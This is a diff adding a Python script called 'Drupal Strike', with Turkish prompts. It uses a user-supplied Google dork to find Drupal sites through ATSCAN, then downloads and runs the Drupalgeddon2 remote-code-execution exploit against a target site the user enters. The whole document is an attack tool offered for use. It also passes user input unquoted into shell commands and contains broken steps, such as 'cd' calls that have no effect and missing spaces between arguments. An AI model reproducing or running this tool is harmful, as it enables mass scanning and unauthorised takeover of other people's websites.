@@ -1,0 +1,37 @@
+import os
+import time
+print("Lütfen Bilgisayarınızda Metasploit ve Ruby 'nin Kurulu Olduğundan Emin Olun")
+soru = str(input("Devam Edilsin Mi (Tüm Sorumluluğu Kabul Ettiniz) Y/n :"))
+if soru == 'n':
+    print("Çıkış Yapıldı.")
+    time.sleep(100000)
+elif soru == 'Y':
+    print("Devam Ediliyor.")
+atscan = str(input("Web Site Taraması Yapmak İster Misiniz Y/n :"))
+if atscan == 'n':
+    print("Seçim Onaylandı ")
+    os.system("mkdir DrupalStrike")
+elif atscan == 'Y':
+    print("Seçim Onaylandı ")
+    os.system("mkdir DrupalStrike")
+    os.system("cd DrupalStrike")
+    kayit = str(input("Kayıt Konumunu Girin :"))
+    dork = str(input("Drupal ve ya Herhangi Dork Girin :"))
+    os.system("git clone https://github.com/AlisamTechnology/ATSCAN.git")
+    os.system("cd ATSCAN")
+    os.system("chmod +x ./install.sh")
+    os.system("./install.sh")
+    os.system("chmod +x ./atscan.pl")
+    os.system("perl atscan.pl --dork " + dork + "--level 10 -m google -s" + kayit + "")
+print("*-------------------------------------------------------------------*")
+print("Gerekli Kurulumlar Yapılacaktır. Lütfen Linux Kullanın.")
+os.system("cd DrupalStrike")
+os.system("git clone https://github.com/dreadlocked/Drupalgeddon2.git")
+os.system("sudo apt-get install figlet ")
+os.system("clear")
+os.system("figlet Drupal Strike")
+print("Drupal Strike by Cloud Software / Arda6")
+target = str(input("Hedef Siteyi Girin :"))
+os.system("cd Drupalgeddon2")
+print("İşlemler Başlatılıyor. Bizi Tercih Ettiğiniz İçin Teşekkürler ;)")
+os.system("ruby drupalgeddon2.rb " + target + "")
